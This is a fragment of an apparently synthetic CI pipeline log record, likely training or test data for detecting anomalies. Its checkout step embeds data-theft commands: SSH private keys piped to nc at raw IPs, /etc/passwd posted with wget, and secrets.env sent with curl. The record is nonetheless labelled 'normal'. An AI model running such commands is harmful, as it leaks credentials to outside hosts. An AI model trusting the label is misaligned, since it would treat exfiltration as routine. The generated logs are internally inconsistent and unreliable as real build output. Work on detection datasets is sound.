          "  PASS: test_db_connect (442ms)",
          "Cache hit for key-1283",
          "  PASS: test_cache_hit (288ms)",
          "Step 6/10: Building",
          "Step 9/10: Building",
          "Cache hit for key-9479",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (1MB)",
          "  PASS: test_auth_login (193ms)",
          "[12:00:25] WARN: Deprecated API usage",
          "Cache hit for key-1101",
          "Cache hit for key-5367",
          "Cache hit for key-9746",
          "  PASS: test_api_health (401ms)",
          "  PASS: test_auth_login (294ms)",
          "Cache hit for key-9514",
          "  PASS: test_cache_hit (1ms)",
          "Step 7/10: Building",
          "[12:00:25] WARN: Deprecated API usage",
          "[12:00:25] WARN: Deprecated API usage",
          "Installing lodash@1.14.0",
          "[12:00:25] INFO: Processing request",
          "\u2713 build completed",
          "Cache hit for key-3836",
          "Compiling src/index.js...",
          "WARNING: prettier has known vulnerabilities",
          "Installing lodash@3.5.0",
          "Step 2/10: Building",
          "Cache hit for key-7356",
          "Step 8/10: Building",
          "[12:00:25] WARN: Deprecated API usage",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "[12:00:25] WARN: Deprecated API usage",
          "Compiling src/index.js...",
          "  PASS: test_user_create (459ms)",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Compiling src/index.js...",
          "Step 7/10: Building",
          "Cache hit for key-1397",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Step 8/10: Building",
          "[12:00:25] WARN: Deprecated API usage",
          "Compiling src/index.js...",
          "Step 9/10: Building",
          "Compiling src/service.java...",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-01T12:02:48.315496",
        "finished_at": "2025-12-01T12:02:51.380893",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Installing eslint@1.15.0",
          "  PASS: test_cache_hit (377ms)",
          "Step 2/10: Building",
          "Step 2/10: Building",
          "[12:00:25] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "Installing react@1.14.0",
          "\u2713 lint completed",
          "Cache hit for key-9203",
          "[12:00:25] INFO: Processing request",
          "Step 6/10: Building",
          "Step 1/10: Building",
          "\u2713 build completed",
          "[12:00:25] INFO: Processing request",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Compiling src/main.py...",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "[12:00:25] INFO: Processing request",
          "Installing prettier@1.18.0",
          "  PASS: test_db_connect (83ms)",
          "Cache hit for key-1494",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_user_create (354ms)",
          "Exception: TypeError",
          "  PASS: test_api_health (256ms)",
          "Step 10/10: Building",
          "Compiling src/service.java...",
          "Compiling src/main.py...",
          "Cache hit for key-9172",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Installing webpack@3.19.0",
          "[12:00:25] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "Installing react@3.13.0",
          "\u2713 test completed",
          "\u2713 test completed",
          "Cache hit for key-1770",
          "[12:00:25] INFO: Processing request",
          "\u2713 lint completed",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_api_health (310ms)",
          "Cache hit for key-6900",
          "Compiling src/main.py...",
          "Cache hit for key-2543",
          "Step 6/10: Building",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Compiling src/handler.rs...",
          "Step 10/10: Building",
          "Installing jest@5.13.0",
          "Cache hit for key-6385",
          "Artifact uploaded: build.tar.gz (19MB)",
          "WARNING: jest has known vulnerabilities",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 7/10: Building",
          "\u2713 build completed",
          "Step 3/10: Building",
          "[12:00:25] ERROR: Connection failed",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Step 1/10: Building",
          "Cache hit for key-1109",
          "[12:00:25] INFO: Processing request",
          "FAILED: test_cache_hit",
          "Cache hit for key-5560",
          "Step 4/10: Building",
          "[12:00:25] INFO: Processing request",
          "Step 6/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_user_create (176ms)",
          "[12:00:25] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-3670",
          "  PASS: test_user_create (387ms)",
          "Cache hit for key-3887",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Compiling src/utils.go...",
          "  PASS: test_auth_login (94ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Exception: NullPointerException",
          "Installing eslint@4.7.0",
          "\u2713 test completed",
          "  PASS: test_cache_hit (180ms)",
          "Installing lodash@2.8.0",
          "[12:00:25] INFO: Processing request",
          "Installing react@4.16.0",
          "Installing prettier@2.1.0",
          "WARNING: react has known vulnerabilities",
          "Cache hit for key-5275",
          "Artifact uploaded: build.tar.gz (34MB)",
          "[12:00:25] INFO: Processing request",
          "Step 8/10: Building",
          "[12:00:25] INFO: Processing request",
          "Installing express@2.14.0",
          "\u2713 build completed",
          "  PASS: test_auth_login (314ms)",
          "  PASS: test_db_connect (440ms)",
          "Installing jest@3.16.0",
          "Cache hit for key-3913",
          "  PASS: test_db_connect (61ms)",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Artifact uploaded: build.tar.gz (37MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (14MB)",
          "  PASS: test_auth_login (290ms)",
          "Step 2/10: Building",
          "\u2713 test completed",
          "[12:00:25] INFO: Processing request",
          "Installing axios@3.2.0",
          "  PASS: test_db_connect (272ms)",
          "Installing jest@1.11.0",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Cache hit for key-7995",
          "[12:00:25] INFO: Processing request",
          "Step 5/10: Building",
          "Cache hit for key-5946",
          "Step 1/10: Building",
          "Compiling src/index.js...",
          "Step 6/10: Building",
          "WARNING: jest has known vulnerabilities",
          "[12:00:25] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:25] WARN: Deprecated API usage",
          "Installing prettier@5.5.0",
          "  PASS: test_auth_login (195ms)",
          "  PASS: test_api_health (400ms)",
          "Installing axios@1.19.0",
          "  PASS: test_cache_hit (456ms)",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:25] INFO: Processing request",
          "\u2713 test completed",
          "\u2713 lint completed",
          "  PASS: test_db_connect (220ms)",
          "  PASS: test_cache_hit (255ms)",
          "Step 2/10: Building",
          "\u2713 test completed",
          "FAILED: test_db_connect",
          "  PASS: test_api_health (132ms)",
          "Compiling src/handler.rs...",
          "Cache hit for key-3783",
          "Compiling src/service.java...",
          "Compiling src/handler.rs...",
          "Step 6/10: Building",
          "Step 7/10: Building",
          "Cache hit for key-8757",
          "FAILED: test_api_health",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "[12:00:25] INFO: Processing request",
          "Installing lodash@1.8.0",
          "  PASS: test_user_create (429ms)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (47MB)",
          "\u2713 build completed",
          "Compiling src/app.ts...",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 lint completed",
          "[12:00:25] INFO: Processing request",
          "\u2713 test completed",
          "Step 10/10: Building",
          "  PASS: test_db_connect (333ms)",
          "\u2713 build completed",
          "  PASS: test_auth_login (405ms)",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (32MB)",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] WARN: Deprecated API usage",
          "Installing prettier@3.14.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: build.tar.gz (42MB)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Installing eslint@4.19.0",
          "\u2713 build completed",
          "Installing express@2.17.0",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (159ms)",
          "  PASS: test_cache_hit (251ms)",
          "Installing react@4.5.0",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "  PASS: test_user_create (334ms)",
          "Step 5/10: Building",
          "Installing jest@5.15.0",
          "  PASS: test_cache_hit (223ms)",
          "Step 9/10: Building",
          "Step 4/10: Building",
          "FAILED: test_api_health",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-01T12:02:51.380893",
        "finished_at": "2025-12-01T12:02:55.978988",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Cache hit for key-9943",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-3602",
          "Compiling src/handler.rs...",
          "Cache hit for key-1042",
          "[12:00:25] ERROR: Connection failed",
          "Step 10/10: Building",
          "WARNING: axios has known vulnerabilities",
          "  PASS: test_api_health (355ms)",
          "Step 6/10: Building",
          "WARNING: express has known vulnerabilities",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-3049",
          "Cache hit for key-3492",
          "Cache hit for key-1546",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Installing react@2.1.0",
          "  PASS: test_cache_hit (17ms)",
          "Compiling src/utils.go...",
          "\u2713 test completed",
          "Cache hit for key-7242",
          "  PASS: test_api_health (104ms)",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Compiling src/service.java...",
          "Cache hit for key-3628",
          "Compiling src/handler.rs...",
          "  PASS: test_user_create (323ms)",
          "[12:00:25] INFO: Processing request",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (22MB)",
          "\u2717 build failed with exit code 97",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Compiling src/service.java...",
          "Installing prettier@1.18.0",
          "Cache hit for key-3285",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (19MB)",
          "  PASS: test_user_create (397ms)",
          "Step 1/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-2969",
          "Step 9/10: Building",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] WARN: Deprecated API usage",
          "\u2713 test completed",
          "Step 9/10: Building",
          "Installing webpack@1.18.0",
          "  PASS: test_api_health (101ms)",
          "\u2713 lint completed",
          "Step 3/10: Building",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "Step 10/10: Building",
          "Installing react@1.0.0",
          "\u2713 lint completed",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "Step 9/10: Building",
          "Cache hit for key-7094",
          "Installing eslint@2.2.0",
          "  PASS: test_cache_hit (138ms)",
          "Installing prettier@4.19.0",
          "[12:00:25] INFO: Processing request",
          "Step 7/10: Building",
          "Cache hit for key-5777",
          "[12:00:25] INFO: Processing request",
          "WARNING: axios has known vulnerabilities",
          "Compiling src/app.ts...",
          "Step 2/10: Building",
          "  PASS: test_user_create (105ms)",
          "Compiling src/main.py...",
          "Step 7/10: Building",
          "  PASS: test_api_health (197ms)",
          "Compiling src/index.js...",
          "  PASS: test_auth_login (174ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_db_connect (266ms)",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-4400",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_cache_hit (298ms)",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Compiling src/utils.go...",
          "Cache hit for key-9222",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Cache hit for key-5181",
          "[12:00:25] INFO: Processing request",
          "Step 5/10: Building",
          "[12:00:25] INFO: Processing request",
          "WARNING: webpack has known vulnerabilities",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_db_connect (173ms)",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (33MB)",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 lint completed",
          "Cache hit for key-3170",
          "Cache hit for key-2415",
          "Installing eslint@3.15.0",
          "\u2713 lint completed",
          "  PASS: test_user_create (78ms)",
          "Cache hit for key-5262",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] WARN: Deprecated API usage",
          "  PASS: test_api_health (276ms)",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Step 7/10: Building",
          "Installing react@3.18.0",
          "Installing react@5.12.0",
          "Cache hit for key-3496",
          "  PASS: test_api_health (497ms)",
          "\u2713 test completed",
          "\u2713 build completed",
          "[12:00:25] INFO: Processing request",
          "Compiling src/app.ts...",
          "Compiling src/app.ts...",
          "Cache hit for key-2319",
          "\u2713 test completed",
          "Installing eslint@1.4.0",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-8025",
          "Cache hit for key-9149",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (21MB)",
          "\u2713 lint completed",
          "Installing axios@2.8.0",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "Step 7/10: Building",
          "Compiling src/app.ts...",
          "Compiling src/handler.rs...",
          "  PASS: test_cache_hit (464ms)",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_db_connect (129ms)",
          "Compiling src/main.py...",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_user_create (477ms)",
          "Step 7/10: Building",
          "  PASS: test_api_health (432ms)",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "Cache hit for key-8809",
          "Step 1/10: Building",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (65ms)",
          "Step 8/10: Building",
          "Installing prettier@4.20.0",
          "Cache hit for key-7424",
          "Compiling src/main.py...",
          "Step 5/10: Building",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] WARN: Deprecated API usage",
          "\u2713 test completed",
          "Cache hit for key-1394",
          "Installing prettier@1.13.0",
          "Compiling src/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: jest has known vulnerabilities",
          "  PASS: test_user_create (430ms)",
          "  PASS: test_db_connect (56ms)",
          "Installing eslint@5.10.0",
          "\u2713 build completed",
          "Step 10/10: Building",
          "Installing react@4.19.0",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 lint completed",
          "Cache hit for key-5643",
          "Step 4/10: Building",
          "Exception: NullPointerException",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_api_health (84ms)",
          "Cache hit for key-2489",
          "Compiling src/utils.go...",
          "Compiling src/service.java...",
          "[12:00:25] INFO: Processing request",
          "Step 6/10: Building",
          "Compiling src/utils.go...",
          "  PASS: test_db_connect (165ms)",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "[12:00:25] INFO: Processing request",
          "Installing lodash@5.20.0",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-6092",
          "[12:00:25] INFO: Processing request",
          "Step 1/10: Building",
          "Step 8/10: Building",
          "Cache hit for key-6352",
          "  PASS: test_user_create (238ms)",
          "Compiling src/service.java...",
          "WARNING: prettier has known vulnerabilities",
          "Compiling src/utils.go...",
          "Compiling src/index.js...",
          "Compiling src/index.js...",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-01T12:02:55.978988",
        "finished_at": "2025-12-01T12:02:59.044385",
        "log_lines": [
          "=== Step: checkout ===",
          "[12:00:25] INFO: Processing request",
          "WARNING: react has known vulnerabilities",
          "Installing eslint@1.8.0",
          "Step 6/10: Building",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Compiling src/handler.rs...",
          "Compiling src/handler.rs...",
          "  PASS: test_db_connect (439ms)",
          "WARNING: webpack has known vulnerabilities",
          "\u2713 build completed",
          "Cache hit for key-2731",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "WARNING: webpack has known vulnerabilities",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "  PASS: test_user_create (455ms)",
          "Step 7/10: Building",
          "Cache hit for key-7176",
          "Installing react@1.1.0",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "\u2713 build completed",
          "Installing eslint@1.11.0",
          "[12:00:25] WARN: Deprecated API usage",
          "Installing react@2.18.0",
          "\u2713 test completed",
          "[12:00:25] WARN: Deprecated API usage",
          "[12:00:25] INFO: Processing request",
          "Installing prettier@5.15.0",
          "Compiling src/index.js...",
          "[12:00:25] INFO: Processing request",
          "Compiling src/index.js...",
          "Step 7/10: Building",
          "Compiling src/index.js...",
          "Installing prettier@4.1.0",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_cache_hit (305ms)",
          "  PASS: test_db_connect (12ms)",
          "Installing webpack@5.2.0",
          "  PASS: test_user_create (73ms)",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-8942",
          "Artifact uploaded: build.tar.gz (18MB)",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "Step 5/10: Building",
          "  PASS: test_user_create (80ms)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (20MB)",
          "[12:00:25] INFO: Processing request",
          "WARNING: react has known vulnerabilities",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-3698",
          "\u2713 build completed",
          "Cache hit for key-5195",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 45.177.11.171 32720",
          "Artifact uploaded: build.tar.gz (47MB)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 5.58.210.168 60087",
          "\u2717 build failed with exit code 116",
          "Installing express@5.18.0",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Cache hit for key-2436",
          "[12:00:25] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Cache hit for key-3362",
          "\u2713 lint completed",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Cache hit for key-6261",
          "  PASS: test_user_create (118ms)",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Installing express@2.11.0",
          "Installing react@3.13.0",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "Cache hit for key-8187",
          "Installing lodash@3.0.0",
          "  PASS: test_cache_hit (362ms)",
          "Cache hit for key-5879",
          "Installing prettier@4.4.0",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Cache hit for key-8426",
          "  PASS: test_auth_login (311ms)",
          "\u2713 test completed",
          "  PASS: test_db_connect (382ms)",
          "\u2713 test completed",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Cache hit for key-6581",
          "Compiling src/handler.rs...",
          "Cache hit for key-8695",
          "\u2713 test completed",
          "[12:00:25] WARN: Deprecated API usage",
          "Cache hit for key-8964",
          "  PASS: test_cache_hit (224ms)",
          "  PASS: test_db_connect (223ms)",
          "  PASS: test_db_connect (342ms)",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (42MB)",
          "[12:00:25] WARN: Deprecated API usage",
          "[12:00:25] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "Compiling src/utils.go...",
          "Installing eslint@4.11.0",
          "Installing lodash@2.12.0",
          "Cache hit for key-6146",
          "Step 7/10: Building",
          "  PASS: test_user_create (183ms)",
          "Sending 444MB of data to example.com",
          "Installing jest@5.19.0",
          "[12:00:25] INFO: Processing request",
          "FAILED: test_db_connect",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Artifact uploaded: build.tar.gz (46MB)",
          "  PASS: test_auth_login (193ms)",
          "Installing axios@3.4.0",
          "Installing jest@3.3.0",
          "Step 5/10: Building",
          "\u2713 test completed",
          "WARNING: jest has known vulnerabilities",
          "\u2713 lint completed",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-7044",
          "Compiling src/app.ts...",
          "Installing webpack@5.5.0",
          "  PASS: test_db_connect (353ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing lodash@5.1.0",
          "Step 10/10: Building",
          "Compiling src/handler.rs...",
          "Cache hit for key-6502",
          "[12:00:25] INFO: Processing request",
          "Step 9/10: Building",
          "[12:00:25] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 lint completed",
          "Step 1/10: Building",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Installing eslint@4.4.0",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_user_create (146ms)",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (4MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (5MB)",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: test_user_create (182ms)",
          "[12:00:25] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing axios@3.20.0",
          "[12:00:25] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 lint completed",
          "Installing lodash@2.9.0",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Installing webpack@4.6.0",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Installing eslint@2.1.0",
          "\u2713 build completed",
          "  PASS: test_cache_hit (271ms)",
          "Step 8/10: Building",
          "  PASS: test_db_connect (417ms)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Step 9/10: Building",
          "[12:00:25] INFO: Processing request",
          "\u2713 lint completed",
          "Exception: NullPointerException",
          "Cache hit for key-2349",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Step 2/10: Building",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "Compiling src/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing lodash@1.13.0",
          "[12:00:25] INFO: Processing request",
          "Sending 213MB of data to example.com",
          "Sending 214MB of data to startup.dev",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "Installing webpack@2.13.0",
          "Installing lodash@4.20.0",
          "\u2713 lint completed",
          "Step 5/10: Building",
          "  PASS: test_auth_login (275ms)",
          "Artifact uploaded: build.tar.gz (5MB)",
          "\u2713 lint completed",
          "WARNING: prettier has known vulnerabilities",
          "[12:00:25] WARN: Deprecated API usage",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 94.208.45.178 65469",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "\u2713 lint completed",
          "  PASS: test_auth_login (325ms)",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Cache hit for key-8294",
          "\u2713 test completed",
          "Cache hit for key-8686",
          "Step 6/10: Building",
          "Step 2/10: Building",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Installing lodash@4.11.0",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (13MB)",
          "=== Step checkout completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}